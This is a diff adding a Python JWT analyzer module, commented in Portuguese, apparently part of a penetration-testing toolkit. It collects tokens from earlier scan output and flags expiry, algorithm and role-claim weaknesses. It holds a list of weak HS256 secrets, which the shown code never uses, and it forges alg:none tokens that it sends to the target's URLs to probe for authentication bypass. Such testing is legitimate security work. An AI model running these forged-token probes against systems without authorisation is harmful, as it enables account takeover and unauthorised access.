@@ -1,0 +1,300 @@
+#!/usr/bin/env python3
+"""
+JWT Analyzer — Coleta, decodifica e testa JWTs
+Testa alg:none, chaves HS256 fracas, expiração
+Captura raw request/response para Burp modal
+"""
+import json
+import re
+import base64
+import time
+from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+from menu import C
+from ..output import info, success, warn, error
+from ..http_utils import format_raw_request, format_raw_response
+
+try:
+    import httpx
+except ImportError:
+    httpx = None
+
+# Chaves HS256 comuns para brute-force
+WEAK_SECRETS = [
+    "secret", "password", "123456", "changeme", "key", "test",
+    "admin", "default", "jwt_secret", "supersecret", "qwerty",
+    "letmein", "abc123", "password1", "your-256-bit-secret",
+    "your-secret-key", "my-secret-key", "jwt-secret", "token",
+    "secretkey", "s3cr3t", "jwt", "hmac", "auth",
+]
+
+JWT_REGEX = re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*')
+
+def ensure_outdir(target):
+    outdir = Path("output") / target / "jwt_analyzer"
+    outdir.mkdir(parents=True, exist_ok=True)
+    return outdir
+
+
+def b64_decode_jwt(segment):
+    """Decode a JWT base64url segment"""
+    segment += "=" * (4 - len(segment) % 4)
+    try:
+        return json.loads(base64.urlsafe_b64decode(segment))
+    except Exception:
+        return None
+
+
+def decode_jwt(token):
+    """Decodifica um JWT sem verificação"""
+    parts = token.split(".")
+    if len(parts) < 2:
+        return None, None
+    
+    header = b64_decode_jwt(parts[0])
+    payload = b64_decode_jwt(parts[1])
+    return header, payload
+
+
+def test_alg_none(token):
+    """Testa se o servidor aceita alg:none"""
+    parts = token.split(".")
+    if len(parts) < 2:
+        return None
+    
+    # Criar token com alg:none
+    none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
+    none_token = f"{none_header}.{parts[1]}."
+    return none_token
+
+
+def check_expiration(payload):
+    """Verifica se o JWT está expirado ou sem expiração"""
+    issues = []
+    
+    exp = payload.get("exp")
+    if not exp:
+        issues.append({"type": "NO_EXPIRATION", "risk": "MEDIUM", "details": "Token sem claim 'exp' — nunca expira"})
+    elif isinstance(exp, (int, float)):
+        if exp < time.time():
+            issues.append({"type": "EXPIRED_TOKEN", "risk": "LOW", "details": f"Token expirado em {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(exp))}"})
+        elif exp - time.time() > 86400 * 30:
+            days = int((exp - time.time()) / 86400)
+            issues.append({"type": "LONG_EXPIRATION", "risk": "MEDIUM", "details": f"Token expira em {days} dias — muito longo"})
+    
+    iat = payload.get("iat")
+    if not iat:
+        issues.append({"type": "NO_ISSUED_AT", "risk": "LOW", "details": "Token sem claim 'iat'"})
+    
+    return issues
+
+
+def collect_jwts(target):
+    """Coleta JWTs de diversas fontes"""
+    base = Path("output") / target
+    jwts = {}  # token -> source
+    
+    # 1) Buscar em arquivos de output
+    search_files = [
+        base / "domain" / "extracted_keys.json",
+        base / "domain" / "extracted_js.json",
+        base / "domain" / "extracted_routes.json",
+    ]
+    
+    for sf in search_files:
+        if sf.exists():
+            try:
+                content = sf.read_text(errors="ignore")
+                for match in JWT_REGEX.finditer(content):
+                    jwts[match.group()] = f"file: {sf.name}"
+            except Exception:
+                pass
+    
+    # 2) Buscar em todos os txt/json do output
+    for f in base.rglob("*.txt"):
+        try:
+            content = f.read_text(errors="ignore")[:100000]
+            for match in JWT_REGEX.finditer(content):
+                if match.group() not in jwts:
+                    jwts[match.group()] = f"file: {f.relative_to(base)}"
+        except Exception:
+            pass
+    
+    for f in base.rglob("*.json"):
+        try:
+            content = f.read_text(errors="ignore")[:100000]
+            for match in JWT_REGEX.finditer(content):
+                if match.group() not in jwts:
+                    jwts[match.group()] = f"file: {f.relative_to(base)}"
+        except Exception:
+            pass
+    
+    return jwts
+
+
+def analyze_jwt(token, source):
+    """Analisa um JWT individual"""
+    header, payload = decode_jwt(token)
+    if not header or not payload:
+        return None
+    
+    findings = []
+    
+    alg = header.get("alg", "unknown")
+    
+    # 1) alg:none test
+    if alg.lower() == "none":
+        findings.append({
+            "type": "ALG_NONE",
+            "risk": "HIGH", 
+            "details": "Token já usa alg:none — potencialmente forjável",
+            "token_preview": token[:50] + "...",
+            "header": header,
+            "payload": payload,
+            "source": source,
+        })
+    
+    # 2) Weak algorithm checks
+    if alg.upper() in ("HS256", "HS384", "HS512"):
+        findings.append({
+            "type": "SYMMETRIC_ALG",
+            "risk": "MEDIUM",
+            "details": f"Token usa algoritmo simétrico '{alg}' — vulnerável a brute-force de chave",
+            "token_preview": token[:50] + "...",
+            "header": header,
+            "payload": payload,
+            "source": source,
+            "alg_none_token": test_alg_none(token),
+        })
+    
+    # 3) Expiration checks
+    exp_issues = check_expiration(payload)
+    for issue in exp_issues:
+        findings.append({
+            **issue,
+            "token_preview": token[:50] + "...",
+            "header": header,
+            "payload": payload,
+            "source": source,
+        })
+    
+    # 4) Sensitive claims
+    sensitive_keys = ["password", "pwd", "secret", "ssn", "credit_card", "private_key"]
+    for key in payload:
+        if key.lower() in sensitive_keys:
+            findings.append({
+                "type": "SENSITIVE_CLAIM",
+                "risk": "HIGH",
+                "details": f"Token contém claim sensível: '{key}'",
+                "token_preview": token[:50] + "...",
+                "header": header,
+                "payload": payload,
+                "source": source,
+            })
+    
+    # 5) Admin/role claims
+    role = payload.get("role", payload.get("roles", payload.get("admin", None)))
+    if role:
+        findings.append({
+            "type": "ROLE_CLAIM",
+            "risk": "MEDIUM",
+            "details": f"Token contém claim de role: {role} — teste alteração para admin/root",
+            "token_preview": token[:50] + "...",
+            "header": header,
+            "payload": payload,
+            "source": source,
+        })
+    
+    return findings if findings else None
+
+
+def test_jwt_on_target(client, url, original_token, none_token):
+    """Testa se o target aceita tokens manipulados"""
+    findings = []
+    
+    if not none_token:
+        return []
+    
+    # Testar com alg:none
+    for header_name in ["Authorization", "Cookie"]:
+        for value in [f"Bearer {none_token}", f"token={none_token}"]:
+            try:
+                resp = client.get(url, headers={header_name: value, "User-Agent": "Mozilla/5.0"}, timeout=10)
+                if resp.status_code == 200:
+                    raw_req = format_raw_request("GET", url, {**dict(resp.request.headers), header_name: value})
+                    raw_res = format_raw_response(resp.status_code, dict(resp.headers), resp.text[:2000])
+                    findings.append({
+                        "url": url,
+                        "type": "ALG_NONE_ACCEPTED",
+                        "risk": "HIGH",
+                        "details": f"Servidor aceitou token com alg:none via {header_name}",
+                        "request_raw": raw_req,
+                        "response_raw": raw_res,
+                    })
+            except Exception:
+                pass
+    
+    return findings
+
+
+def run(context: dict):
+    target = context.get("target")
+    if not target:
+        raise ValueError("Target required")
+
+    info(
+        f"\n🟪───────────────────────────────────────────────────────────🟪\n"
+        f"   🔑  {C.BOLD}{C.CYAN}JWT ANALYZER{C.END}\n"
+        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
+        f"🟪───────────────────────────────────────────────────────────🟪\n"
+    )
+
+    outdir = ensure_outdir(target)
+    results_file = outdir / "jwt_results.json"
+    
+    # Coletar JWTs
+    info(f"   🔍 Coletando JWTs dos outputs...")
+    jwts = collect_jwts(target)
+    
+    if not jwts:
+        info("Nenhum JWT encontrado nos outputs")
+        json.dump([], open(results_file, "w"))
+        return [str(results_file)]
+    
+    info(f"   📊 {len(jwts)} JWTs encontrados")
+    
+    all_findings = []
+    
+    # Analisar cada JWT
+    for token, source in jwts.items():
+        findings = analyze_jwt(token, source)
+        if findings:
+            all_findings.extend(findings)
+            for f in findings:
+                info(f"   🚨 {C.YELLOW}{f['type']}: {f['details'][:60]}{C.END}")
+    
+    # Testar tokens com alg:none contra o target (se httpx disponível)
+    if httpx and all_findings:
+        info(f"   🧪 Testando tokens manipulados contra o target...")
+        
+        urls_file = Path("output") / target / "domain" / "urls_valid.txt"
+        if urls_file.exists():
+            test_urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()][:20]
+            
+            with httpx.Client(verify=False, timeout=10) as client:
+                for finding in all_findings:
+                    none_token = finding.get("alg_none_token")
+                    if none_token:
+                        for url in test_urls[:5]:
+                            live_findings = test_jwt_on_target(client, url, finding.get("token_preview", ""), none_token)
+                            all_findings.extend(live_findings)
+    
+    results_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False, default=str))
+    
+    if all_findings:
+        success(f"🔑 {len(all_findings)} problemas JWT encontrados!")
+    else:
+        success("✅ Nenhum problema JWT detectado")
+    
+    return [str(results_file)]
